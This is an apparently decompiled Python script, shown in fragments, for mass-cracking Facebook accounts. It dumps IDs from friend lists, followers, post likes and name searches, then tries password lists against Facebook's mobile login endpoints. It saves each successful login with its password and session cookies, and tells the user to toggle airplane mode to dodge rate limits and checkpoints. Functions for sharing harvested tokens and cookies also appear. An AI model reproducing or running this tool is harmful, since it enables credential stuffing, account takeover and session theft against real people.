...
# Time Succes decompile : 2022-03-27 13:08:43.020324
import os,sys,time,datetime,re,json,uuid,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,time,re,json
import os, sys, re, time, requests, random, bs4, subprocess, uuid, json 
...
Crackfb = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=Crackfb,stderr=subprocess.STDOUT)
Crackfb.close()
if my_music !=0:
...
{U}[{P}>{H}]{P} Au : Shah Dino BaLoch
{II}[{P}>{H}]{P} Wa : +923175889358
{M}[{P}>{H}]{P} Fb : facebook.com/Shah Dino
{O}[{P}•{K}]{P}—————————————————————————————""")
		jalan(google)
	def mani(self):
		self.tampilan_logo()
		...
		try:
			...
			os.sys.exit()
		tam_menu = f"""{Q}[{C}•{Q}]--> {B}Ingfo Akun{Q}
+ {U}Nama Dino    : {II}{nama}{Q}
+ {II}Idz Dino     : {M}{idz}{Q}
+ {O}Status Login : {B}{zza}{Q}
+ {M}INFO <> Harap gunakan dengan bijak : V

{Q}--------------------------------------------------->
{Q}[{C}•{Q}]--> {M}Menu Vvip{Q} <--[|{Q}---------------------------------------------------> {U}Status{Q}"""
		jalan(tam_menu)
		print(f' [01]. Crack Dari Daftar Teman ({M}Massal{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' [02]. Crack Dari Daftar Teman				{II}ON{Q}');time.sleep(0.25)
		print(f' [03]. Crack Dari Pengikut				{II}ON{Q}');time.sleep(0.25)
		print(f' [04]. Crack Dari Pengikut ({B}Ultimate Dump{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' [05]. Crack Dari Pencarian Nama ({K}Tidak Login{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' [06]. Crack Dari Like Postingan			{II}ON{Q}');time.sleep(0.25)
		print(f' [07]. Crack Dari Komentar				{M}OFF{Q}');time.sleep(0.25)
		print(f' [08]. Crack Dari Member Group				{M}OFF{Q}');time.sleep(0.25)
		print(f' [09]. Crack Dari Saran Teamn				{M}OFF{Q}');time.sleep(0.25)
		print(f' [10]. Check Jumlah Teman ({M}Rawan Check Point{Q})		{II}ON{Q}');time.sleep(0.25)
		...
		print(f' [13].  Auto Share					{II}ON{Q}');time.sleep(0.25)
	...
	def public_(self):
		...
		if id_ == "0" or "0" == id_:
			...
			print(f"[{C}•{Q}]--> Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |--> Nama Dino Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |--> Silahkan Copy Nama Dino Dump Tadi !!")
			jalan(" |--> Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'--> Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
	...
	def cekfile_crk(self, folder):
		...
		for file in dirs:
			...
			try:ijo__ = filex.split("Dino/OK-")[1];ijo_ = (Q+" |-->"+I+"Hasil/OK-"+ijo__);print(ijo_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
			try:kuning__ = filex.split("Dino/CP-")[1];kuning_ = (Q+" |-->"+K+"Hasil/CP-"+kuning__);print(kuning_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
	def rek(self):
	...
	def check_opsii(self):
		...
		try:
			...
			time.sleep(2)
			self.check_opsii()
		jalan(" |-->  Lanjut Harap Hidup Matikan Mode Pesawat Selama 2 Detik")
...
class crackmenu:
	...
	def menu_crack(self):
		...
		print(Q+" |--> 3. Mbasic V3 ("+II+"Recommended"+Q+")");time.sleep(0.02)
		print(' |')

	def menu_crack_m(self):
		jalan(war+"Silahkan Pilih Metode Login !")
		print(' |')
		jalan(" |-->Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat")
		print(Q+" |-->1. Mobile V1 ");time.sleep(0.02)
		...
		if "" == "":
			for pw in kiky__gtg:
				...
				if 'c_user' in session.cookies.get_dict():
					...
					ok.append(wrt)
					open('Dino/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
	...
	def mobile_v4(self, user, kiky__gtg):
		...
		if "" == "":
			for pw in kiky__gtg:
				...
				t = par(requests.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=h1).text,'html.parser') 
				...
				"flow":"login_no_pin",
				"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				requests.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=h2, allow_redirects = False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
...
def token_me(token):
	try:
		...
		post4 = ('259731103030874') # Logo Zero From Risky 2021
		post5 = ("716736976359896") # Untuk Berbagi Token Dan Cookie Facebook
...
def free_token():
	...
	freetoken = []
	url_x = [
			"https://free.facebook.com/100040708001839/posts/716736976359896/?app=fbl"
			"https://free.facebook.com/story.php?story_fbid=259731103030874&id=100069819591035&_rdr",
			"https://free.facebook.com/story.php?story_fbid=716736976359896&id=100040708001839&_rdr",
		]
	for link_ in url_x:
